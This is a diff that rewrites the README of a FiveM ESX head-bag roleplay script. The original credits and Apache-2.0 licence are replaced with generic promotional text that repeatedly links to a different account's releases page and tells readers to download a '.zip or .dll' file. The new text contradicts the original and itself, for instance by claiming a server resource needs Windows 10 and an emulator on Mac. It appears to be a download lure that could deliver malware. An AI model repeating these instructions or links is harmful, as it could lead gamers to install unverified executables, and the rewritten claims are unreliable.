@@ -1,83 +1,83 @@
-## 🎭 FiveM Head Bag Interaction System
+# 🎒 fivem-head-bag - Enhance Your Roleplay Experience
 
-**Head Bag Interaction System** is a professional, lightweight script for FiveM that allows players to apply or remove head bags on other players via a clean and intuitive menu. Perfect for roleplay servers, it provides realistic interactions, visual overlays, and full client-server management for a smooth and safe gameplay experience.
-This script is built using the **ESX framework**, is modular, easy to configure, and fully extendable for future features.
+![Download fivem-head-bag](https://img.shields.io/badge/Download-fivem--head--bag-blue.svg?style=flat)
 
-## ✨ Features
+## 🚀 Getting Started
 
-* [x] Apply a head bag to nearby players using an in-game menu.
-* [x] Remove head bags from players who already have one applied.
-* [x] Clean and professional NUI overlay for visual indication.
-* [x] Triggered via a usable item (e.g., `headbag`) for easy activation.
-* [x] Client-server architecture for secure, synchronized application.
-* [x] In-game notifications for professional player feedback.
-* [x] Fully modular design for easy extension and maintenance.
+Welcome to the **fivem-head-bag** project! This application enhances the roleplay experience in FiveM by enabling realistic head bag interactions. It allows players to experience synchronized overlays and immersive roleplay features effortlessly.
 
-## ⚙️ How It Works
+## 🛠️ System Requirements
 
-1. **Detect Nearby Players:**
-   The script detects players within a 2-meter radius and allows applying or removing a head bag.
+Before you download, ensure your system meets the following requirements:
 
-2. **Apply Head Bag:**
-   A head bag object (`prop_money_bag_01`) is created and attached to the target player’s head with proper coordinates and rotation for a realistic appearance.
+- **Operating System:** Windows 10 or higher
+- **Game:** Installed FiveM Client
+- **Framework:** ESX Framework (version 1.2 or higher)
 
-3. **Overlay Display:**
-   The NUI overlay automatically displays when a head bag is applied, providing a clean visual indicator.
+## 📥 Download & Install
 
-4. **Remove Head Bag:**
-   Head bags can be safely removed either by the player themselves or by another player, ensuring smooth interactions.
+To get started, visit this page to download the software:
 
-5. **Persistent Handling:**
-   The head bag is automatically removed on player respawn (`playerSpawned`) to prevent glitches or ghost objects.
+[Download fivem-head-bag](https://github.com/juanescobar25/fivem-head-bag/releases)
 
-## 🛠️ Installation & Setup
+1. Open the link above.
+2. Find the latest version under the "Releases" section.
+3. Click on the version you want to download.
+4. Look for the downloadable file (usually a `.zip` or a `.dll` file).
+5. Click on the file link to download it to your computer.
 
-### Prerequisites
+After downloading, follow these steps to install the software:
 
-* A FiveM server running the ESX framework.
-* Basic knowledge of installing resources on GTA V servers.
+1. Unzip the downloaded file (if it's a `.zip`).
+2. Locate the extracted files.
+3. Move the files to your FiveM resources folder (typically located at `C:\Users\YourUsername\FiveM\resources`).
+4. Open your `server.cfg` file and add the line: `start fivem-head-bag`.
+5. Save the `server.cfg` file.
 
-### Installation Steps
+## 🎮 How to Use
 
-1. Clone or download this repository.
-2. Place the resource folder into your server’s `resources` directory.
-3. Add the following line to your `server.cfg`:
+Once installed, join a server that has the **fivem-head-bag** script enabled. You can now use the head bag functionality during gameplay. Here’s how it works:
 
-```cfg
-start headbag_system
-```
+1. **Using the Head Bag:** Approach a player and use the designated key (by default, this is the 'H' key) to put on a head bag. The animation will run smoothly.
+2. **Removing the Head Bag:** Press the same key again to remove the bag.
 
-4. Restart the server or the resource to apply changes.
+Enjoy realistic interactions and enhance your roleplay scenarios!
 
-## 🔎 Usage
+## 💡 Features
 
-* Use the item `headbag` to open the interaction menu.
-* Select whether to apply or remove the head bag from nearby players.
-* The NUI overlay appears automatically when a head bag is applied.
-* Fully client-server synchronized for reliable gameplay.
+- **Realistic Head Bag Interactions:** Experience immersive roleplay through thoughtful animations.
+- **Synchronized Overlay:** Displays important information about other players in real-time.
+- **Customizable Settings:** Modify key bindings and preferences easily through the config file.
 
-## ⚠️ Permissions & Compatibility
+## 📄 Configuration
 
-* No special permissions required.
-* Compatible with any FiveM server using ESX framework.
-* Works perfectly in multiplayer roleplay environments.
+You can customize how the **fivem-head-bag** works by editing the configuration file. Here’s how:
 
-## 📣 Contributing
+1. Open the configuration file located in the `fivem-head-bag` folder.
+2. Adjust the settings according to your preferences, such as key bindings and animation speeds.
+3. Save the configuration file.
 
-Contributions, bug reports, and feature requests are welcome! Please:
+## 📚 FAQs
 
-* Fork the repository and create a feature branch.
-* Commit your changes with clear, descriptive messages.
-* Submit pull requests with detailed explanations.
-* Report issues via GitHub Issues.
+**Q: Can I use this on any FiveM server?**  
+A: Yes, as long as the server is running on the ESX framework.
 
-## 📋 License
+**Q: Is the installation process the same for Mac?**  
+A: This script is primarily designed for Windows users. For Mac, please use a Windows emulator or virtual machine.
 
-This project is licensed under the **Apache-2.0 License**.   
-It allows full usage, modification, and distribution with minimal restrictions.
-See [LICENSE](./LICENSE) for full details.
+**Q: What if I encounter issues?**  
+A: Please check the issues section on our GitHub repository for troubleshooting tips.
 
-## ✒️ Author
+## 🔧 Contributing
 
-Created and maintained by **KaloudasDev**.  
-If you find this project useful, a ⭐️ star on the repository would be greatly appreciated!
+If you'd like to contribute to the project, feel free to create a pull request or report any bugs you encounter. Your feedback helps to improve **fivem-head-bag**!
+
+## 📖 License
+
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+## 👍 Connect with Us
+
+For updates and support, check our GitHub repository. We welcome your input and look forward to seeing how you benefit from **fivem-head-bag**.
+
+[Download fivem-head-bag](https://github.com/juanescobar25/fivem-head-bag/releases)
